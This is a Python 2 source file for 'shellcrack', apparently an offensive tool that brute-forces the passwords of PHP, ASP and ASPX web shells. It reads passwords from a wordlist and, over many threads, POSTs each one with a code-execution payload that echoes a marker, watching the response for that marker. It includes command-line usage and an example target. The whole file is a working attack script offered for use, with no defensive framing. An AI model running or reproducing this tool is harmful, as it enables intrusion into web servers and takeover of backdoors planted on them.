#coding:utf-8
import requests
import sys,getopt
import Queue
import threading
import time

screenLock=threading.Semaphore(value=1)
passlist =[]
exitFlag = 0
count =0
queueLock = threading.Lock()
workQueue = Queue.Queue(180000)
threadlist = []
successpwd=""
lines=0

class myThread (threading.Thread):
	def __init__(self,ix,st,url, q):
		threading.Thread.__init__(self)
		self.ix=ix
		self.st = st
		self.url=url
		self.q = q
	def run(self):
		cracker(self.ix,self.st,self.url, self.q)

def cracker(ix,st,url,q):
	global successpwd
	global count
	while not exitFlag:
		queueLock.acquire()
		if not workQueue.empty():
			pwd = q.get()
			try:
				if(st=='php'):
					payload={pwd:'echo \"[fl4g]\";'}
				elif st=='asp':
					payload={pwd:'response.write(\'[fl4g]\')'}
				elif st=='aspx':
					payload={pwd:'Response.Write(\"[fl4g]\");'}
				else:
					payload={pwd:'echo \"[fl4g]\";'}
				screenLock.acquire()
				r=requests.post("http://"+url,data=payload,timeout=3,verify=False)
				if r.text.find("[fl4g]")>=0:
					successpwd=pwd
					count=count+1 
					bar = ProgressBar(count=count,total = lines)
					bar.log(pwd)
					screenLock.release()
				else:
					count=count+1 
					bar = ProgressBar(count=count,total = lines)
					bar.log(pwd)
					screenLock.release()
			except Exception as e:
				print '[-]host seem down!!!'
			queueLock.release()
		else:
			queueLock.release()

class ProgressBar:
	def __init__(self, count = 0, total = 0, width = 30):
		self.count = count
		self.total = total
		self.width = width
	def move(self):
		self.count += 1
	def log(self, s):
		sys.stdout.write(' ' * (47) +'error'+ '\r')
		sys.stdout.flush()
		print '[-]:',s
		progress = self.width * self.count / self.total
		sys.stdout.write(' progress：'+'{0:3}/{1:3}: '.format(self.count,self.total))
		sys.stdout.write('>' * progress + '-' * (self.width - progress) + '\r')
		if progress == self.width:
			sys.stdout.write('\n')
		sys.stdout.flush()


def passdicgen(filepath):
	global lines
	thefile=open(filepath)
	line=thefile.readline().strip('\n').strip('\r')
	while line:
		passlist.append(line)
		line=thefile.readline().strip('\n').strip('\r')
		lines=lines+1
	thefile.close()

def usage():
	print '''
shellcrack v1.0 code by pentestlab.net
'''
	print "<Usage>: python shellcrack.py -u \"http://www.test.com/shell.php\" [options]\n"
	print "[options]:"
	print "          -p --pwdfile  (dic path  c:/pwd.txt  /home/pwd.txt)"
	print "          -s --script   (shell sctipt type eg. asp php aspx )"
	print "          -t --threads   "
	print "<example>:"
	print "          python shellcrack.py -u \"http://www.test.com/shell.php\" -t php -p d:\\test.txt -t 10"
	sys.exit()

if __name__ == '__main__':
	shellurl=dicpath=scripttype=threads=None
	try:
		opts,args = getopt.getopt(sys.argv[1:],'u:p:s:t:',['url=','pwdfile=','script=','threads='])
	except getopt.GetoptError,e:
		usage()
	for op,value in opts:
		if op=="-u" or op=="--url":
			shellurl=value.replace('http://','')
		elif op=="-p" or op=="--pwdfile":
			dicpath=value
		elif op=="-s" or op=="--script":
			scripttype=value
		elif op=="-t" or op=="--threads":
			threads=int(value)
		elif op=="-h" or op=="--help" :
			usage()
			sys.exit()
	if not shellurl or not dicpath or not scripttype or not threads:
		usage()
	passdicgen(dicpath)
	if len(passlist) <1:
		print 'dics is empty'
		sys.exit()
	time.sleep(1)
	print '[-]load dics success!'
	time.sleep(1)
	print "start ......"
	for  ix in range(threads):
		 	thread = myThread(ix,scripttype,shellurl,workQueue)
			thread.start()
			threadlist.append(thread)
	queueLock.acquire()
	for passwd in passlist:
		workQueue.put(passwd)
	queueLock.release()

	while not workQueue.empty():
		pass
	exitFlag = 1
	for t in threadlist:
		t.join()
	print "password is :",successpwd  
	print "crack over !!!!"
